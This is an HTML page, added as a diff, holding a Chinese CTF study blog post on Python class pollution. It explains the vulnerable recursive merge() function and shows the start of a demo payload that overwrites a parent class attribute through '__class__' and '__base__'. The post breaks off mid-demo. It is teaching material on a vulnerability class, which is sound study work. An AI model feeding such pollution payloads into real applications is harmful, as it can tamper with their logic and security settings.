@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x01废话碰到一道nodejs的原型链污染，但我的包师傅让我先去学python的原型链污染，所以我比较听劝，马上就来学习一下，这篇文章的话也会对python的一些基础概念进行一个总结 0x02正文讲到原型链污染，我们首先都知道什么是原型链污染 什么是原型链污染?Python 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python原型链污染">
+<meta property="og:url" content="https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="root@wanth3f1ag">
+<meta property="og:description" content="0x01废话碰到一道nodejs的原型链污染，但我的包师傅让我先去学python的原型链污染，所以我比较听劝，马上就来学习一下，这篇文章的话也会对python的一些基础概念进行一个总结 0x02正文讲到原型链污染，我们首先都知道什么是原型链污染 什么是原型链污染?Python 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3167109-20231127220702292-213744840.png">
+<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3167109-20231127220756895-1817807341.png">
+<meta property="article:published_time" content="2025-04-30T07:25:12.000Z">
+<meta property="article:modified_time" content="2025-06-08T09:31:37.147Z">
+<meta property="article:author" content="wanTh3flag">
+<meta property="article:tag" content="python原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/3167109-20231127220702292-213744840.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>python原型链污染</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">H0me</a></li><!--
+     --><!--
+       --><li><a href="/about/">A6out</a></li><!--
+     --><!--
+       --><li><a href="/tags/">T6gs</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Catagory</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">s4arch</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/30/SSTI%E7%9A%84%E7%A7%AF%E7%B4%AF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/30/ctfshow%E5%8D%95%E8%BA%AB%E6%9D%AF2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&text=python原型链污染"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&is_video=false&description=python原型链污染"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=python原型链污染&body=Check out this article: https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&title=python原型链污染"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&name=python原型链污染&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/30/pyhton%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/&t=python原型链污染"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E5%BA%9F%E8%AF%9D"><span class="toc-number">1.</span> <span class="toc-text">0x01废话</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E6%AD%A3%E6%96%87"><span class="toc-number">2.</span> <span class="toc-text">0x02正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">2.1.</span> <span class="toc-text">什么是原型链污染?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">2.2.</span> <span class="toc-text">关于原型链?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%92%8C%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.4.</span> <span class="toc-text">类和实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">污染条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hasattr-%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.1.</span> <span class="toc-text">hasattr()函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E8%BF%87%E7%A8%8B"><span class="toc-number">2.6.</span> <span class="toc-text">污染过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.7.</span> <span class="toc-text">绕过姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.8.</span> <span class="toc-text">攻击姿势</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%95%E9%A2%98%E9%A2%98%E7%9B%AE"><span class="toc-number">2.9.</span> <span class="toc-text">试题题目</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GeekChallenge2023-ezpython"><span class="toc-number">2.9.1.</span> <span class="toc-text">[GeekChallenge2023]ezpython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DSACTF2023%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E8%B5%9B%E2%80%93EzFlask"><span class="toc-number">2.9.2.</span> <span class="toc-text">DSACTF2023七月暑期赛–EzFlask</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        python原型链污染
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wanTh3flag</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-30T07:25:12.000Z" class="dt-published" itemprop="datePublished">2025-04-30</time>
+        
+        (Updated: <time datetime="2025-06-08T09:31:37.147Z" class="dt-updated" itemprop="dateModified">2025-06-08</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">python原型链污染</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">python原型链污染</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="0x01废话"><a href="#0x01废话" class="headerlink" title="0x01废话"></a>0x01废话</h1><p>碰到一道nodejs的原型链污染，但我的包师傅让我先去学python的原型链污染，所以我比较听劝，马上就来学习一下，这篇文章的话也会对python的一些基础概念进行一个总结</p>
+<h1 id="0x02正文"><a href="#0x02正文" class="headerlink" title="0x02正文"></a>0x02正文</h1><p>讲到原型链污染，我们首先都知道什么是原型链污染</p>
+<h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染?"></a>什么是原型链污染?</h2><p>Python 中的原型链污染（Prototype Pollution）是指通过修改对象原型链中的属性，对程序的行为产生意外影响或利用漏洞进行攻击的一种技术。</p>
+<h2 id="关于原型链"><a href="#关于原型链" class="headerlink" title="关于原型链?"></a>关于原型链?</h2><p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>原型链污染攻击的思路是通过<strong>修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果</strong>。常见的原型链污染攻击包括修改内置对象的原型、修改全局对象的原型等</p>
+<p>Python原型链污染和Nodejs原型链污染的根本原理一样，Nodejs是对键值对的控制来进行污染，而Python则是对类属性值的污染，且只能对类的属性来进行污染不能够污染类的方法。</p>
+<h2 id="类和实例"><a href="#类和实例" class="headerlink" title="类和实例"></a>类和实例</h2><p>在讲述原型链污染之前，我们要先了解python中的类和实例的关系</p>
+<p>因为python是以OOP(面向对象编程)的方式进行编程的，这里的话包括了几个核心的概念</p>
+<ul>
+<li><strong>类（Class）</strong>：类是一个模板或蓝图，它定义了对象的属性和方法（即行为）。</li>
+<li><strong>对象（Object）</strong>：对象是类的实例。每个对象都有自己独立的属性（数据）和方法（函数）。</li>
+<li><strong>封装（Encapsulation）</strong>：封装是将数据和操作数据的方法绑定在一起的过程，它隐藏了对象的内部实现细节，只暴露必要的接口给外部使用。</li>
+<li><strong>继承（Inheritance）</strong>：继承允许我们基于现有的类创建新类，新类（子类）可以继承现有类（父类）的属性和方法，并添加新的属性和方法或重写现有的方法。</li>
+<li><strong>多态（Polymorphism）</strong>：多态允许我们使用统一的接口来调用不同类中的方法，这些方法可以有不同的实现。</li>
+</ul>
+<p>我们先讲类和对象，因为这个的话其实和后面的实例还是有关联的</p>
+<p>和php类似的，在python中，类是通过class去定义的，类定义了一个对象的模板，里面包括了对象的属性和方法，一般我们叫做类属性(类变量)和类方法</p>
+<p>具体实例</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">name</span>:</span><br><span class="line">    name = <span class="string">&quot;John&quot;</span><span class="comment">#类属性</span></span><br><span class="line">    age = <span class="number">25</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):<span class="comment">#实例方法</span></span><br><span class="line">        <span class="variable language_">self</span>.name = name<span class="comment">#实例属性</span></span><br><span class="line">        <span class="variable language_">self</span>.age = age<span class="comment">#实例属性</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">display</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Name:&quot;</span>, <span class="variable language_">self</span>.name)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Age:&quot;</span>, <span class="variable language_">self</span>.age)</span><br><span class="line"></span><br><span class="line"><span class="comment">#实例化对象</span></span><br><span class="line">a = name(<span class="string">&quot;Jane&quot;</span>, <span class="number">30</span>)</span><br><span class="line"><span class="comment">#访问对象的属性</span></span><br><span class="line"><span class="built_in">print</span>(a.name)</span><br><span class="line"><span class="built_in">print</span>(a.age)</span><br><span class="line"><span class="comment">#调用对象的方法</span></span><br><span class="line">a.display()</span><br><span class="line"><span class="comment">#Jane</span></span><br><span class="line"><span class="comment">#30</span></span><br><span class="line"><span class="comment">#Name: Jane</span></span><br><span class="line"><span class="comment">#Age: 30</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，name是一个类，里面定义了name和age属性，还定义了一个__init__是一种特殊的方法，类似于php里面的construct魔术方法，被称为初始化方法。然后下面对类实例化成对象，并举例了怎么访问对象的属性和调用对象的方法</p>
+<p>接下来我们讲一下实例方法</p>
+<p>实例方法是与对象实例相关联的方法。它们通过对象的引用来调用，并且可以访问和修改对象的属性。实例方法的第一个参数通常是 <code>self</code>，它是对当前对象的引用。在调用实例方法时，Python 会自动将调用该方法的对象作为 <code>self</code> 参数传递。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span>:</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">__init__</span>(<span class="title">self</span>, <span class="title">make</span>, <span class="title">model</span>, <span class="title">year</span>):</span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">make</span> = <span class="title">make</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">model</span> = <span class="title">model</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">year</span> = <span class="title">year</span></span></span><br><span class="line"><span class="class">        <span class="title">self</span>.<span class="title">odometer_reading</span> = 0</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    # 实例方法，用于描述对象的行为</span></span><br><span class="line"><span class="class">    <span class="title">def</span> <span class="title">describe</span>(<span class="title">self</span>):</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">f</span>&quot;</span>&#123;<span class="built_in">self</span>.year&#125; &#123;<span class="built_in">self</span>.make&#125; &#123;<span class="built_in">self</span>.model&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # 另一个实例方法，用于更新对象的属性</span></span><br><span class="line"><span class="string">    def update_odometer(self, mileage):</span></span><br><span class="line"><span class="string">        if mileage &gt;= self.odometer_reading:</span></span><br><span class="line"><span class="string">            self.odometer_reading = mileage</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            print(&quot;</span>You can<span class="string">&#x27;t roll back an odometer!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 创建对象</span></span><br><span class="line"><span class="string">my_car = Car(&#x27;</span>audi<span class="string">&#x27;, &#x27;</span>a4<span class="string">&#x27;, 2016)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 调用实例方法</span></span><br><span class="line"><span class="string">print(my_car.describe())  # 输出: 2016 audi a4</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 更新对象的属性</span></span><br><span class="line"><span class="string">my_car.update_odometer(1000)</span></span><br><span class="line"><span class="string">print(my_car.odometer_reading)  # 输出: 1000</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>Car</code> 类定义了一个汽车对象的模板，包括制造商（<code>make</code>）、型号（<code>model</code>）、年份（<code>year</code>）和里程表读数（<code>odometer_reading</code>）等属性。<code>describe</code> 和 <code>update_odometer</code> 是实例方法，它们分别用于描述汽车的信息和更新里程表读数。</p>
+<h2 id="污染条件"><a href="#污染条件" class="headerlink" title="污染条件"></a>污染条件</h2><p>主要的就是一个merge合并函数，merge函数就是python中对属性值控制的一个操作，通过merge函数去修改类属性的值，结合nodejs的merge来理解就是将源参数赋值到目标参数。</p>
+<p>在我们的CTF中，常见的merge函数就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):  <span class="comment">#src为源字典，dst为目标字典</span></span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>): </span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))  </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  </span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个函数的主要目的是将一个源字典（<code>src</code>）的内容合并到目标字典（<code>dst</code>）中，支持嵌套字典的递归合并。我们逐句分析一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for k, v in src.items():</span><br></pre></td></tr></table></figure>
+
+<p>这里的话会遍历src的键值对，k是字典src的键，v是字典src的值，而<code>src.items()</code>是返回一个包含字典所有键值对的视图对象（<code>dict_items</code>），每个键值对以元组 <code>(k, v)</code> 的形式表示。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if hasattr(dst, &#x27;__getitem__&#x27;):</span><br></pre></td></tr></table></figure>
+
+<h3 id="hasattr-函数"><a href="#hasattr-函数" class="headerlink" title="hasattr()函数"></a>hasattr()函数</h3><p><code>hasattr</code> 是 Python 内置的一个函数，用于检查一个对象是否具有指定的属性。</p>
+<p>基础语法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hasattr</span>(<span class="built_in">object</span>, name)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>object</strong>: 这是要检查的对象。</li>
+<li><strong>name</strong>: 这是要检查的属性名称，必须是一个字符串。</li>
+</ul>
+<p>这里通过hasattr函数 <strong>检查对象是否具有指定的属性或方法</strong>，这里用来检查dst中是否有<code>__getitem__</code>方法，用于实现对象的索引操作，如果 <code>dst</code> 是列表、字典、元组、字符串等支持索引操作的对象，则条件为真。</p>
+<ul>
+<li>如果此时的dst是字典或其他类似字典的对象，则进如if语句</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">    merge(v, dst.get(k))  </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    dst[k] = v</span><br></pre></td></tr></table></figure>
+
+<p><code>dst.get(k)</code>去获取dst中k的值，检查k的值是否存在且v是否是字典，如果是则执行<code>merge(v, dst.get(k)) </code>，也就是将v作为src源字典传入，dst中的k值作为新的目标字典dst传入，继续递归调用merge，如果不是则令dst中k对应的值为v的值</p>
+<ul>
+<li>如果此时的dst不是字典，则进行elif语句</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:  </span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br></pre></td></tr></table></figure>
+
+<p>hasattr(dst, k)检查dst中是否存在k属性，并且检查v是否是字典，如果是则执行<code>merge(v, getattr(dst, k))</code>，也就是将作为src源字典传入，<code>getattr(dst, k)</code>用于 <strong>动态获取对象 <code>dst</code> 的属性或方法</strong>。它的作用类似于直接通过 <code>dst.k</code> 访问属性或方法，例如当k等于<code>__init__</code>的时候，则新的dst为<code>dst.__init__</code>的结果。如果不是的话则执行<code>setattr(dst, k, v)</code>，将值 <code>v</code> 赋给对象 <code>dst</code> 的属性 <code>k</code></p>
+<h2 id="污染过程"><a href="#污染过程" class="headerlink" title="污染过程"></a>污染过程</h2><p>通过属性和方法的一层层调用，从而实现属性的修改</p>
+<p>例如我们写个demo</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">father</span>:</span><br><span class="line">    secret = <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_a</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">son_b</span>(<span class="title class_ inherited__">father</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment">#父子类继承，son_a 和 son_b 类都继承自 father 类</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__base__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;secret&quot;</span> : <span class="string">&quot;world&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(son_a.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line"><span class="built_in">print</span>(instance.secret)</span><br><span class="line"><span class="comment">#hello</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span 